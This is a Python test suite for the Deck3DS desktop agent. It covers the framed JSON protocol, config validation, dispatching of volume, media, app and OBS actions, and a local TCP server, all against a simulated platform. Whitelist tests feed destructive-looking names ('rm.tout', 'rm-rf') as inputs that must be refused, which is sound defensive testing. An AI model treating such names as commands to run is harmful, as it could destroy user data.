"""Tests de l'agent Deck3DS.

Exécution : python3 -m tests.test_agent  (depuis le dossier agent/)

Les tests n'utilisent aucune dépendance externe et ne touchent jamais au
système hôte : une plateforme simulée enregistre les appels reçus.
"""

# Deck3DS — Copyright (C) 2026 Romuald (@RomualdYT)
# Free software under the GNU GPL v3. See LICENSE for details.

from __future__ import annotations

import asyncio
import inspect
import json
import sys
import tempfile
import threading
import unittest
from pathlib import Path
from unittest.mock import patch

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from deck3ds import config as config_module  # noqa: E402
from deck3ds import protocol  # noqa: E402
from deck3ds.actions import Dispatcher  # noqa: E402
from deck3ds.platforms.base import (  # noqa: E402
    ActionFailed,
    MediaInfo,
    Platform,
    Unsupported,
)
from deck3ds.server import Server, _snapshot_payload  # noqa: E402


class FakePlatform(Platform):
    """Plateforme simulée : mémorise l'état et journalise les appels."""

    name = "fake"

    def __init__(self) -> None:
        self.volume = 40
        self.muted = False
        self.mic_muted = False
        self.app_volume: int | None = 30
        self.outputs = ["Haut-parleurs", "Enceinte", "Casque"]
        self.output_index = 0
        self.calls: list[str] = []
        self.fail_next: str | None = None

    def get_app_volume(self):
        return self.app_volume

    def set_app_volume(self, value):
        self._maybe_fail("set_app_volume")
        self.calls.append(f"set_app_volume:{value}")
        self.app_volume = max(0, min(100, int(value)))

    # --- Sortie audio ---

    def get_audio_output(self):
        return self.outputs[self.output_index]

    def list_audio_outputs(self):
        return list(self.outputs)

    def cycle_audio_output(self):
        self.output_index = (self.output_index + 1) % len(self.outputs)
        self.calls.append(f"cycle_output:{self.get_audio_output()}")
        return self.get_audio_output()

    def select_audio_output(self, needle):
        for index, name in enumerate(self.outputs):
            if needle.lower() in name.lower():
                self.output_index = index
                self.calls.append(f"select_output:{name}")
                return name
        raise ActionFailed(f"sortie introuvable : {needle}")

    def _maybe_fail(self, name: str) -> None:
        if self.fail_next == name:
            self.fail_next = None
            raise ActionFailed(f"echec simule de {name}")

    def get_volume(self):
        return self.volume

    def set_volume(self, value):
        self._maybe_fail("set_volume")
        self.calls.append(f"set_volume:{value}")
        self.volume = max(0, min(100, int(value)))

    def is_muted(self):
        return self.muted

    def set_muted(self, muted):
        self.calls.append(f"set_muted:{muted}")
        self.muted = muted

    def is_mic_muted(self):
        return self.mic_muted

    def set_mic_muted(self, muted):
        self.calls.append(f"set_mic:{muted}")
        self.mic_muted = muted

    def get_media(self):
        return MediaInfo("Titre", "Artiste", "FauxLecteur", True)

    def media_play_pause(self):
        self.calls.append("play_pause")

    def media_next(self):
        self.calls.append("next")

    def media_previous(self):
        self.calls.append("previous")

    def get_active_app(self):
        return "Terminal"

    def list_apps(self):
        return ["Terminal", "Safari"]

    def launch_app(self, target):
        self._maybe_fail("launch_app")
        self.calls.append(f"launch:{target}")

    def list_windows(self):
        return [("Safari", "Page"), ("Terminal", "shell")]

    def focus_window(self, app, title):
        self.calls.append(f"focus:{app}|{title}")
        return title or app

    def quit_app(self, target):
        self.calls.append(f"quit:{target}")

    def open_url(self, url):
        self.calls.append(f"url:{url}")

    def open_path(self, path):
        self.calls.append(f"path:{path}")

    def send_hotkey(self, keys):
        self.calls.append(f"hotkey:{keys}")

    def lock_session(self):
        self.calls.append("lock")

    def get_cpu(self):
        return 25

    def get_memory(self):
        return 50

    def spawn(self, command):
        self.calls.append("spawn:" + " ".join(command))


# --- Protocole ----------------------------------------------------------------


class TestProtocol(unittest.TestCase):
    def test_aller_retour(self):
        original = {"type": "ping", "id": 3}
        raw = protocol.encode(original)

        reader = protocol.FrameReader()
        reader.feed(raw)
        self.assertEqual(list(reader), [original])

    def test_entete_longueur(self):
        raw = protocol.encode({"type": "ping", "id": 1})
        payload_length = int.from_bytes(raw[:4], "big")
        self.assertEqual(payload_length, len(raw) - 4)

    def test_messages_colles(self):
        """TCP peut livrer plusieurs messages d'un coup."""
        data = protocol.encode({"type": "ping", "id": 1}) + protocol.encode(
            {"type": "ping", "id": 2}
        )
        reader = protocol.FrameReader()
        reader.feed(data)
        self.assertEqual([m["id"] for m in reader], [1, 2])

    def test_message_fragmente(self):
        """TCP peut aussi livrer un message en plusieurs morceaux."""
        data = protocol.encode({"type": "ping", "id": 7})
        reader = protocol.FrameReader()

        for index in range(len(data) - 1):
            reader.feed(data[index : index + 1])
            self.assertEqual(list(reader), [], "message incomplet livre trop tot")

        reader.feed(data[-1:])
        self.assertEqual([m["id"] for m in reader], [7])

    def test_fragmentation_octet_par_octet_multiple(self):
        data = protocol.encode({"type": "ping", "id": 1}) + protocol.encode(
            {"type": "pong", "id": 2}
        )
        reader = protocol.FrameReader()
        received = []
        for byte in data:
            reader.feed(bytes([byte]))
            received.extend(reader)
        self.assertEqual([m["id"] for m in received], [1, 2])

    def test_longueur_aberrante_rejetee(self):
        reader = protocol.FrameReader()
        reader.feed((10**9).to_bytes(4, "big") + b"x")
        with self.assertRaises(protocol.ProtocolError):
            list(reader)

    def test_json_invalide_rejete(self):
        payload = b"{pas du json"
        reader = protocol.FrameReader()
        reader.feed(len(payload).to_bytes(4, "big") + payload)
        with self.assertRaises(protocol.ProtocolError):
            list(reader)

    def test_racine_non_objet_rejetee(self):
        payload = b"[1,2,3]"
        reader = protocol.FrameReader()
        reader.feed(len(payload).to_bytes(4, "big") + payload)
        with self.assertRaises(protocol.ProtocolError):
            list(reader)

    def test_utf8_preserve(self):
        message = {"type": "action.result", "message": "Micro coupé — été"}
        reader = protocol.FrameReader()
        reader.feed(protocol.encode(message))
        self.assertEqual(list(reader)[0]["message"], "Micro coupé — été")

    def test_message_trop_grand_refuse(self):
        with self.assertRaises(protocol.ProtocolError):
            protocol.encode({"type": "x", "data": "a" * (protocol.MAX_MESSAGE + 10)})


# --- Configuration ------------------------------------------------------------


def minimal_config(**overrides):
    base = {
        "pages": [
            {
                "id": "main",
                "title": "Principal",
                "buttons": [
                    {"id": "b1", "slot": 0, "label": "Un", "action": "noop"}
                ],
            }
        ]
    }
    base.update(overrides)
    return base


class TestConfig(unittest.TestCase):
    def test_minimal_valide(self):
        parsed = config_module.parse(minimal_config())
        self.assertEqual(len(parsed.pages), 1)
        self.assertEqual(parsed.pages[0].buttons[0].id, "b1")

    def test_config_livree_valide(self):
        """La configuration fournie avec le projet doit être valide."""
        path = Path(__file__).resolve().parent.parent / "config.json"
        parsed = config_module.load(path)
        self.assertGreaterEqual(len(parsed.pages), 1)

    def test_action_abregee(self):
        parsed = config_module.parse(minimal_config())
        self.assertEqual(parsed.pages[0].buttons[0].action.kind, "noop")

    def test_action_inconnue_rejetee(self):
        raw = minimal_config()
        raw["pages"][0]["buttons"][0]["action"] = "rm.tout"
        with self.assertRaises(config_module.ConfigError) as ctx:
            config_module.parse(raw)
        self.assertIn("inconnue", str(ctx.exception))

    def test_argument_obligatoire_manquant(self):
        raw = minimal_config()
        raw["pages"][0]["buttons"][0]["action"] = {"type": "app.launch"}
        with self.assertRaises(config_module.ConfigError) as ctx:
            config_module.parse(raw)
        self.assertIn("target", str(ctx.exception))

    def test_slot_hors_bornes(self):
        raw = minimal_config()
        raw["pages"][0]["buttons"][0]["slot"] = 9
        with self.assertRaises(config_module.ConfigError):
            config_module.parse(raw)

    def test_slots_dupliques(self):
        raw = minimal_config()
        raw["pages"][0]["buttons"] = [
            {"id": "a", "slot": 0, "label": "A", "action": "noop"},
            {"id": "b", "slot": 0, "label": "B", "action": "noop"},
        ]
        with self.assertRaises(config_module.ConfigError) as ctx:
            config_module.parse(raw)
        self.assertIn("double", str(ctx.exception))

    def test_identifiants_pages_dupliques(self):
        raw = minimal_config()
        raw["pages"].append(dict(raw["pages"][0]))
        with self.assertRaises(config_module.ConfigError):
            config_module.parse(raw)

    def test_trop_de_boutons(self):
        raw = minimal_config()
        raw["pages"][0]["buttons"] = [
            {"id": f"b{i}", "slot": i % 6, "label": "X", "action": "noop"}
            for i in range(7)
        ]
        with self.assertRaises(config_module.ConfigError):
            config_module.parse(raw)

    def test_trop_de_pages(self):
        raw = {
            "pages": [
                {"id": f"p{i}", "title": "T", "buttons": []} for i in range(13)
            ]
        }
        with self.assertRaises(config_module.ConfigError):
            config_module.parse(raw)

    def test_label_trop_long(self):
        raw = minimal_config()
        raw["pages"][0]["buttons"][0]["label"] = "A" * 40
        with self.assertRaises(config_module.ConfigError):
            config_module.parse(raw)

    def test_libelle_localise(self):
        raw = minimal_config()
        raw["pages"][0]["buttons"][0]["label"] = {"en": "Browser", "fr": "Navigateur"}
        parsed = config_module.parse(raw)
        button = parsed.pages[0].buttons[0]

        self.assertEqual(button.label("en"), "Browser")
        self.assertEqual(button.label("fr"), "Navigateur")
        self.assertEqual(
            parsed.snapshot_payload("fr")["pages"][0]["buttons"][0]["label"],
            "Navigateur",
        )

    def test_libelle_simple_partout(self):
        """Une chaîne simple reste valable dans toutes les langues."""
        raw = minimal_config()
        raw["pages"][0]["buttons"][0]["label"] = "Discord"
        parsed = config_module.parse(raw)
        button = parsed.pages[0].buttons[0]

        self.assertEqual(button.label("en"), "Discord")
        self.assertEqual(button.label("fr"), "Discord")

    def test_titre_de_page_localise(self):
        raw = minimal_config()
        raw["pages"][0]["title"] = {"en": "Main", "fr": "Principal"}
        parsed = config_module.parse(raw)

        self.assertEqual(parsed.pages[0].title("en"), "Main")
        self.assertEqual(parsed.pages[0].title("fr"), "Principal")

    def test_anglais_obligatoire(self):
        raw = minimal_config()
        raw["pages"][0]["buttons"][0]["label"] = {"fr": "Navigateur"}
        with self.assertRaises(config_module.ConfigError) as ctx:
            config_module.parse(raw)
        self.assertIn("en", str(ctx.exception))

    def test_langue_inconnue_rejetee(self):
        raw = minimal_config()
        raw["pages"][0]["buttons"][0]["label"] = {"en": "A", "de": "B"}
        with self.assertRaises(config_module.ConfigError):
            config_module.parse(raw)

    def test_langue_manquante_retombe_en_anglais(self):
        raw = minimal_config()
        raw["pages"][0]["buttons"][0]["label"] = {"en": "Only English"}
        parsed = config_module.parse(raw)
        self.assertEqual(parsed.pages[0].buttons[0].label("fr"), "Only English")

    def test_libelle_localise_trop_long(self):
        raw = minimal_config()
        raw["pages"][0]["buttons"][0]["label"] = {"en": "A" * 40}
        with self.assertRaises(config_module.ConfigError):
            config_module.parse(raw)

    def test_config_livree_bilingue(self):
        """La configuration fournie doit différer entre les deux langues."""
        path = Path(__file__).resolve().parent.parent / "config.json"
        parsed = config_module.load(path)

        anglais = [page.title("en") for page in parsed.pages]
        francais = [page.title("fr") for page in parsed.pages]
        self.assertNotEqual(anglais, francais, "aucun titre n'est traduit")

    def test_icone_de_page(self):
        raw = minimal_config()
        raw["pages"][0]["icon"] = "music"
        parsed = config_module.parse(raw)
        self.assertEqual(parsed.pages[0].icon, "music")
        self.assertEqual(parsed.snapshot_payload()["pages"][0]["icon"], "music")

    def test_icone_de_page_par_defaut(self):
        parsed = config_module.parse(minimal_config())
        self.assertEqual(parsed.pages[0].icon, "page")

    def test_icone_de_page_inconnue_rejetee(self):
        raw = minimal_config()
        raw["pages"][0]["icon"] = "licorne"
        with self.assertRaises(config_module.ConfigError):
            config_module.parse(raw)

    def test_icone_inconnue(self):
        raw = minimal_config()
        raw["pages"][0]["buttons"][0]["icon"] = "licorne"
        with self.assertRaises(config_module.ConfigError):
            config_module.parse(raw)

    def test_couleur_invalide(self):
        raw = minimal_config()
        raw["pages"][0]["buttons"][0]["color"] = "rouge"
        with self.assertRaises(config_module.ConfigError):
            config_module.parse(raw)

    def test_couleur_courte_acceptee(self):
        raw = minimal_config()
        raw["pages"][0]["buttons"][0]["color"] = "#F00"
        self.assertTrue(config_module.parse(raw))

    def test_page_open_vers_page_inexistante(self):
        raw = minimal_config()
        raw["pages"][0]["buttons"][0]["action"] = {
            "type": "page.open",
            "page": "fantome",
        }
        with self.assertRaises(config_module.ConfigError) as ctx:
            config_module.parse(raw)
        self.assertIn("inexistante", str(ctx.exception))

    def test_script_non_declare(self):
        raw = minimal_config()
        raw["pages"][0]["buttons"][0]["action"] = {
            "type": "script.run",
            "script": "absent",
        }
        with self.assertRaises(config_module.ConfigError) as ctx:
            config_module.parse(raw)
        self.assertIn("non declare", str(ctx.exception))

    def test_script_declare_accepte(self):
        raw = minimal_config(scripts={"build": ["echo", "ok"]})
        raw["pages"][0]["buttons"][0]["action"] = {
            "type": "script.run",
            "script": "build",
        }
        self.assertTrue(config_module.parse(raw))

    def test_port_hors_bornes(self):
        with self.assertRaises(config_module.ConfigError):
            config_module.parse(minimal_config(server={"port": 99999}))

    def test_intervalle_hors_bornes(self):
        with self.assertRaises(config_module.ConfigError):
            config_module.parse(minimal_config(server={"poll_interval": 0.01}))

    def test_pages_vides_rejetees(self):
        with self.assertRaises(config_module.ConfigError):
            config_module.parse({"pages": []})

    def test_booleen_refuse_pour_entier(self):
        """True est un entier en Python : le piège doit être détecté."""
        with self.assertRaises(config_module.ConfigError):
            config_module.parse(minimal_config(server={"port": True}))

    def test_json_invalide_message_clair(self):
        with tempfile.NamedTemporaryFile(
            "w", suffix=".json", delete=False
        ) as handle:
            handle.write("{ pas du json")
            path = Path(handle.name)
        try:
            with self.assertRaises(config_module.ConfigError) as ctx:
                config_module.load(path)
            self.assertIn("ligne", str(ctx.exception))
        finally:
            path.unlink()

    def test_fichier_absent(self):
        with self.assertRaises(config_module.ConfigError):
            config_module.load(Path("/inexistant/config.json"))

    def test_payload_sans_action(self):
        """La 3DS ne doit jamais recevoir les détails d'exécution."""
        raw = minimal_config()
        raw["pages"][0]["buttons"][0]["action"] = {
            "type": "path.open",
            "path": "/Users/prive/secret",
        }
        parsed = config_module.parse(raw)
        text = json.dumps(parsed.snapshot_payload())
        self.assertNotIn("secret", text)
        self.assertNotIn("path", text)

    def test_integration_obs_aller_retour(self):
        raw = minimal_config(
            integrations={
                "obs": {
                    "enabled": True,
                    "host": "studio.local",
                    "port": 4456,
                    "password": "secret",
                    "timeout": 3.5,
                }
            }
        )

        parsed = config_module.parse(raw)
        serialized = config_module.to_raw(parsed)["integrations"]["obs"]

        self.assertTrue(parsed.obs.enabled)
        self.assertEqual(parsed.obs.host, "studio.local")
        self.assertEqual(serialized["port"], 4456)
        self.assertEqual(serialized["password"], "secret")

    def test_action_obs_source_exige_scene_et_source(self):
        raw = minimal_config()
        raw["pages"][0]["buttons"][0]["action"] = {
            "type": "obs.source.toggle",
            "scene": "Direct",
        }
        with self.assertRaises(config_module.ConfigError) as caught:
            config_module.parse(raw)
        self.assertIn("source", str(caught.exception))

    def test_configuration_obs_invalide_rejetee(self):
        raw = minimal_config(integrations={"obs": {"enabled": True, "port": 70000}})
        with self.assertRaises(config_module.ConfigError) as caught:
            config_module.parse(raw)
        self.assertIn("port", str(caught.exception))


# --- Actions ------------------------------------------------------------------


class TestDispatcher(unittest.TestCase):
    def setUp(self):
        self.platform = FakePlatform()
        self.config = config_module.parse(
            minimal_config(scripts={"build": ["echo", "ok"]})
        )
        self.dispatcher = Dispatcher(self.platform, self.config)

    def run_action(self, kind, **args):
        return self.dispatcher.run(config_module.Action(kind, args))

    def test_volume_relatif(self):
        self.platform.volume = 40
        outcome = self.run_action("volume.up", step=5)
        self.assertTrue(outcome.ok)
        self.assertEqual(self.platform.volume, 45)
        self.assertTrue(outcome.state_changed)

    def test_volume_borne_haute(self):
        self.platform.volume = 98
        self.run_action("volume.up", step=10)
        self.assertEqual(self.platform.volume, 100)

    def test_volume_borne_basse(self):
        self.platform.volume = 3
        self.run_action("volume.down", step=10)
        self.assertEqual(self.platform.volume, 0)

    def test_volume_pas_negatif_traite_en_absolu(self):
        """Un pas négatif sur volume.up ne doit pas baisser le son."""
        self.platform.volume = 50
        self.run_action("volume.up", step=-5)
        self.assertEqual(self.platform.volume, 55)

    def test_volume_set_borne(self):
        self.run_action("volume.set", value=500)
        self.assertEqual(self.platform.volume, 100)

    def test_volume_application_independant(self):
        """Régler la musique ne doit pas toucher au volume système."""
        self.platform.volume = 65
        self.platform.app_volume = 30

        outcome = self.run_action("app_volume.up", step=7)

        self.assertTrue(outcome.ok)
        self.assertEqual(self.platform.app_volume, 37)
        self.assertEqual(self.platform.volume, 65, "le volume PC a bouge")

    def test_volume_application_bornes(self):
        self.platform.app_volume = 97
        self.run_action("app_volume.up", step=10)
        self.assertEqual(self.platform.app_volume, 100)

        self.platform.app_volume = 4
        self.run_action("app_volume.down", step=10)
        self.assertEqual(self.platform.app_volume, 0)

    def test_volume_application_set(self):
        self.run_action("app_volume.set", value=250)
        self.assertEqual(self.platform.app_volume, 100)

    def test_volume_application_absent(self):
        """Sans lecteur pilotable, l'action échoue avec un message clair."""
        self.platform.app_volume = None
        outcome = self.run_action("app_volume.up")
        self.assertFalse(outcome.ok)
        self.assertTrue(outcome.message)

    def test_bascule_micro(self):
        self.platform.mic_muted = False
        self.run_action("mic.mute_toggle")
        self.assertTrue(self.platform.mic_muted)
        self.run_action("mic.mute_toggle")
        self.assertFalse(self.platform.mic_muted)

    def test_bascule_son(self):
        self.run_action("volume.mute_toggle")
        self.assertTrue(self.platform.muted)

    def test_media(self):
        self.run_action("media.play_pause")
        self.run_action("media.next")
        self.run_action("media.previous")
        self.assertEqual(self.platform.calls, ["play_pause", "next", "previous"])

    def test_media_signale_effet_lent(self):
        """La diffusion vers une enceinte demande une confirmation différée."""
        for action in ("media.play_pause", "media.next", "media.previous"):
            outcome = self.run_action(action)
            self.assertTrue(outcome.slow_effect, action)

    def test_volume_ne_signale_pas_effet_lent(self):
        """Le volume est immédiat : pas de relecture différée inutile."""
        self.assertFalse(self.run_action("volume.up").slow_effect)

    def test_sortie_audio_cycle(self):
        outcome = self.run_action("audio_output.cycle")
        self.assertTrue(outcome.ok)
        self.assertEqual(outcome.message, "Enceinte")
        self.assertTrue(outcome.state_changed)

    def test_sortie_audio_selection(self):
        outcome = self.run_action("audio_output.set", target="Casque")
        self.assertTrue(outcome.ok)
        self.assertIn("Casque", outcome.message)

    def test_sortie_audio_introuvable(self):
        outcome = self.run_action("audio_output.set", target="Inexistant")
        self.assertFalse(outcome.ok)
        self.assertTrue(outcome.message)

    def test_sortie_audio_cible_manquante(self):
        outcome = self.run_action("audio_output.set")
        self.assertFalse(outcome.ok)

    def test_selection_fenetre(self):
        outcome = self.run_action("window.focus", app="Safari", title="Page")
        self.assertTrue(outcome.ok)
        self.assertIn("focus:Safari|Page", self.platform.calls)

    def test_selection_fenetre_sans_application(self):
        outcome = self.run_action("window.focus", title="Page")
        self.assertFalse(outcome.ok)
        self.assertEqual(self.platform.calls, [])

    def test_lancement_application(self):
        outcome = self.run_action("app.launch", target="Safari")
        self.assertTrue(outcome.ok)
        self.assertIn("launch:Safari", self.platform.calls)

    def test_page_open_renvoie_navigation(self):
        outcome = self.run_action("page.open", page="music")
        self.assertTrue(outcome.ok)
        self.assertEqual(outcome.open_page, "music")

    def test_script_liste_blanche(self):
        outcome = self.run_action("script.run", script="build")
        self.assertTrue(outcome.ok)
        self.assertIn("spawn:echo ok", self.platform.calls)

    def test_script_hors_liste_refuse(self):
        outcome = self.run_action("script.run", script="rm-rf")
        self.assertFalse(outcome.ok)
        # Le message dépend de la langue : on vérifie qu'il nomme le script
        # fautif plutôt qu'un mot précis.
        self.assertIn("rm-rf", outcome.message)
        self.assertEqual(self.platform.calls, [])

    def test_echec_plateforme_remonte(self):
        self.platform.fail_next = "launch_app"
        outcome = self.run_action("app.launch", target="Safari")
        self.assertFalse(outcome.ok)
        self.assertIn("echec simule", outcome.message)

    def test_action_non_supportee(self):
        class Bare(Platform):
            pass

        dispatcher = Dispatcher(Bare(), self.config)
        outcome = dispatcher.run(config_module.Action("mic.mute_toggle", {}))
        self.assertFalse(outcome.ok)
        self.assertTrue(outcome.message)

    def test_exception_inattendue_ne_propage_pas(self):
        class Broken(Platform):
            def is_mic_muted(self):
                return False

            def set_mic_muted(self, muted):
                raise RuntimeError("boum")

        dispatcher = Dispatcher(Broken(), self.config)
        outcome = dispatcher.run(config_module.Action("mic.mute_toggle", {}))
        self.assertFalse(outcome.ok)
        self.assertIn("RuntimeError", outcome.message)

    def test_appui_long_sans_action_ne_rejoue_pas(self):
        button = self.config.pages[0].buttons[0]
        self.dispatcher.run_button(button, hold=True)
        self.assertEqual(self.platform.calls, [])

    def test_snapshot_isole_les_pannes(self):
        """Une source cassée ne doit pas priver le reste des données."""

        class PartlyBroken(FakePlatform):
            def get_cpu(self):
                raise RuntimeError("capteur casse")

        snapshot = PartlyBroken().snapshot()
        self.assertIsNone(snapshot.cpu)
        self.assertEqual(snapshot.volume, 40)
        self.assertEqual(snapshot.active_app, "Terminal")

    def test_obs_refuse_quand_integration_desactivee(self):
        outcome = self.run_action("obs.scene.set", scene="Direct")
        self.assertFalse(outcome.ok)
        self.assertTrue(outcome.message)

    def test_obs_change_de_scene(self):
        requests = []

        class FakeObsClient:
            def __init__(self, config):
                self.config = config

            def __enter__(self):
                return self

            def __exit__(self, *unused):
                return None

            def request(self, kind, data=None):
                requests.append((kind, data))
                return {}

        self.config.obs.enabled = True
        with patch("deck3ds.actions.ObsClient", FakeObsClient):
            outcome = self.run_action("obs.scene.set", scene="Direct")

        self.assertTrue(outcome.ok)
        self.assertEqual(
            requests,
            [("SetCurrentProgramScene", {"sceneName": "Direct"})],
        )

    def test_obs_bascule_une_source(self):
        requests = []

        class FakeObsClient:
            def __init__(self, config):
                self.config = config

            def __enter__(self):
                return self

            def __exit__(self, *unused):
                return None

            def request(self, kind, data=None):
                requests.append((kind, data))
                if kind == "GetSceneItemId":
                    return {"sceneItemId": 42}
                if kind == "GetSceneItemEnabled":
                    return {"sceneItemEnabled": True}
                return {}

        self.config.obs.enabled = True
        with patch("deck3ds.actions.ObsClient", FakeObsClient):
            outcome = self.run_action(
                "obs.source.toggle", scene="Direct", source="Camera"
            )

        self.assertTrue(outcome.ok)
        self.assertEqual(
            requests[-1],
            (
                "SetSceneItemEnabled",
                {
                    "sceneName": "Direct",
                    "sceneItemId": 42,
                    "sceneItemEnabled": False,
                },
            ),
        )


class TestObsProtocol(unittest.TestCase):
    def test_authentification_exemple_officiel(self):
        from deck3ds.obs import ObsClient

        obs_config = config_module.ObsConfig(password="supersecretpassword")
        client = ObsClient(obs_config)
        authentication = client._authentication(
            "+IxH4CnCqMhwVBNa1mImM0xUwQ7Dw8gdkpOFWw5tOXQ=",
            "lEJq47q97l34P6YCPVAoQLOU4YYwNZOQ0sNIRz1GQnU=",
        )
        self.assertEqual(
            authentication,
            "3mcHavhrlV/WjBJq7nRyT9oyhV5uW/2sBOtoNrRfsTM=",
        )


# --- Sérialisation de l'état ---------------------------------------------------


class TestStatePayload(unittest.TestCase):
    def test_valeurs_inconnues_omises(self):
        snapshot = FakePlatform().snapshot()
        snapshot.volume = None
        snapshot.cpu = None
        payload = _snapshot_payload(snapshot)
        self.assertNotIn("volume", payload)
        self.assertNotIn("cpu", payload)
        self.assertIn("time", payload)

    def test_media_absent_devient_null(self):
        snapshot = FakePlatform().snapshot()
        snapshot.media = None
        self.assertIsNone(_snapshot_payload(snapshot)["media"])

    def test_media_sans_titre_devient_null(self):
        snapshot = FakePlatform().snapshot()
        snapshot.media = MediaInfo("", "", "", False)
        self.assertIsNone(_snapshot_payload(snapshot)["media"])

    def test_liste_apps_bornee(self):
        snapshot = FakePlatform().snapshot()
        snapshot.apps = [f"App{i}" for i in range(30)]
        self.assertLessEqual(len(_snapshot_payload(snapshot)["apps"]), 8)

    def test_payload_encodable(self):
        payload = _snapshot_payload(FakePlatform().snapshot())
        self.assertTrue(protocol.encode(payload))


# --- Serveur, de bout en bout --------------------------------------------------


class TestServerEndToEnd(unittest.IsolatedAsyncioTestCase):
    async def asyncSetUp(self):
        self.platform = FakePlatform()
        raw = minimal_config()
        raw["pages"][0]["buttons"] = [
            {
                "id": "mic",
                "slot": 0,
                "label": "Micro",
                "toggle": "mic_muted",
                "action": "mic.mute_toggle",
            },
            {"id": "vol", "slot": 1, "label": "Vol+", "action": "volume.up"},
            {
                "id": "nav",
                "slot": 2,
                "label": "Aller",
                "action": {"type": "page.open", "page": "main"},
            },
        ]
        # Le port réel est attribué par le système ci-dessous ; celui-ci doit
        # simplement rester dans les bornes acceptées par la validation.
        raw["server"] = {"host": "127.0.0.1", "port": 38123, "poll_interval": 0.3}

        self.config = config_module.parse(raw)
        self.server = Server(self.config, self.platform)
        # Silence pendant les tests.
        self.server.log = lambda message: None

        self.server._server = await asyncio.start_server(
            self.server._handle_client, "127.0.0.1", 0
        )
        self.port = self.server._server.sockets[0].getsockname()[1]
        self.poller = asyncio.create_task(self.server._poll_loop())

    async def asyncTearDown(self):
        self.poller.cancel()
        self.server._server.close()
        await self.server._server.wait_closed()

    async def connect(self):
        reader, writer = await asyncio.open_connection("127.0.0.1", self.port)
        return reader, writer, protocol.FrameReader()

    async def receive(self, reader, frames, expected_type, timeout=4.0):
        """Attend un message d'un type donné."""
        deadline = asyncio.get_running_loop().time() + timeout
        while True:
            for message in frames:
                if message.get("type") == expected_type:
                    return message

            remaining = deadline - asyncio.get_running_loop().time()
            if remaining <= 0:
                raise AssertionError(f"message '{expected_type}' non recu")

            data = await asyncio.wait_for(reader.read(8192), timeout=remaining)
            if not data:
                raise AssertionError("connexion fermee")
            frames.feed(data)

    async def handshake(self, token=None):
        reader, writer, frames = await self.connect()
        hello = {"type": "hello", "protocol": 1, "device": "test"}
        if token is not None:
            hello["token"] = token
        writer.write(protocol.encode(hello))
        await writer.drain()
        return reader, writer, frames

    async def test_handshake_et_config(self):
        reader, writer, frames = await self.handshake()
        ok = await self.receive(reader, frames, "hello.ok")
        self.assertEqual(ok["protocol"], 1)

        snapshot = await self.receive(reader, frames, "config.snapshot")
        self.assertEqual(len(snapshot["pages"]), 1)
        self.assertEqual(len(snapshot["pages"][0]["buttons"]), 3)

        writer.close()
        await writer.wait_closed()

    async def test_appui_bouton_execute_et_repond(self):
        reader, writer, frames = await self.handshake()
        await self.receive(reader, frames, "config.snapshot")

        writer.write(
            protocol.encode(
                {
                    "type": "button.press",
                    "id": 42,
                    "page": "main",
                    "button": "mic",
                    "hold": False,
                }
            )
        )
        await writer.drain()

        result = await self.receive(reader, frames, "action.result")
        self.assertEqual(result["id"], 42)
        self.assertTrue(result["ok"])
        self.assertTrue(self.platform.mic_muted)

        writer.close()
        await writer.wait_closed()

    async def test_bouton_inconnu_echoue_proprement(self):
        reader, writer, frames = await self.handshake()
        await self.receive(reader, frames, "config.snapshot")

        writer.write(
            protocol.encode(
                {
                    "type": "button.press",
                    "id": 1,
                    "page": "main",
                    "button": "fantome",
                }
            )
        )
        await writer.drain()

        result = await self.receive(reader, frames, "action.result")
        self.assertFalse(result["ok"])
        self.assertIn("inconnu", result["message"])

        writer.close()
        await writer.wait_closed()

    async def test_navigation_renvoyee(self):
        reader, writer, frames = await self.handshake()
        await self.receive(reader, frames, "config.snapshot")

        writer.write(
            protocol.encode(
                {"type": "button.press", "id": 5, "page": "main", "button": "nav"}
            )
        )
        await writer.drain()

        result = await self.receive(reader, frames, "action.result")
        self.assertEqual(result.get("open_page"), "main")

        writer.close()
        await writer.wait_closed()

    async def test_diffusion_etat(self):
        reader, writer, frames = await self.handshake()
        state = await self.receive(reader, frames, "state.update")
        self.assertEqual(state["volume"], 40)
        self.assertIn("time", state)

        writer.close()
        await writer.wait_closed()

    async def test_ping_pong(self):
        reader, writer, frames = await self.handshake()
        await self.receive(reader, frames, "config.snapshot")

        writer.write(protocol.encode({"type": "ping", "id": 99}))
        await writer.drain()

        pong = await self.receive(reader, frames, "pong")
        self.assertEqual(pong["id"], 99)

        writer.close()
        await writer.wait_closed()

    async def test_config_request(self):
        reader, writer, frames = await self.handshake()
        await self.receive(reader, frames, "config.snapshot")

        writer.write(protocol.encode({"type": "config.request", "id": 1}))
        await writer.drain()

        again = await self.receive(reader, frames, "config.snapshot")
        self.assertIn("pages", again)

        writer.close()
        await writer.wait_closed()

    async def test_action_refusee_avant_handshake(self):
        """Sans handshake, aucune action ne doit être exécutée."""
        reader, writer, frames = await self.connect()
        writer.write(
            protocol.encode(
                {"type": "button.press", "id": 1, "page": "main", "button": "mic"}
            )
        )
        await writer.drain()
        await asyncio.sleep(0.3)

        self.assertFalse(self.platform.mic_muted)
        self.assertEqual(self.platform.calls, [])

        writer.close()
        await writer.wait_closed()

    async def test_protocole_incompatible_refuse(self):
        reader, writer, frames = await self.connect()
        writer.write(protocol.encode({"type": "hello", "protocol": 999}))
        await writer.drain()

        error = await self.receive(reader, frames, "hello.error")
        self.assertIn("protocole", error["reason"])

        writer.close()
        await writer.wait_closed()

    async def test_jeton_invalide_refuse(self):
        self.config.token = "bonjeton"

        reader, writer, frames = await self.handshake(token="mauvais")
        error = await self.receive(reader, frames, "hello.error")
        self.assertIn("jeton", error["reason"])

        writer.close()
        await writer.wait_closed()

    async def test_jeton_valide_accepte(self):
        self.config.token = "bonjeton"

        reader, writer, frames = await self.handshake(token="bonjeton")
        await self.receive(reader, frames, "hello.ok")

        writer.close()
        await writer.wait_closed()

    async def test_trame_invalide_ferme_sans_crash(self):
        reader, writer, frames = await self.connect()
        writer.write((10**9).to_bytes(4, "big") + b"xxxx")
        await writer.drain()
        await asyncio.sleep(0.3)

        # Le serveur doit rester opérationnel pour les autres consoles.
        reader2, writer2, frames2 = await self.handshake()
        await self.receive(reader2, frames2, "hello.ok")

        writer.close()
        writer2.close()

    async def test_deux_consoles_simultanees(self):
        reader1, writer1, frames1 = await self.handshake()
        await self.receive(reader1, frames1, "hello.ok")

        reader2, writer2, frames2 = await self.handshake()
        await self.receive(reader2, frames2, "hello.ok")

        self.assertEqual(len(self.server.clients), 2)

        # Les deux reçoivent l'état.
        await self.receive(reader1, frames1, "state.update")
        await self.receive(reader2, frames2, "state.update")

        writer1.close()
        writer2.close()
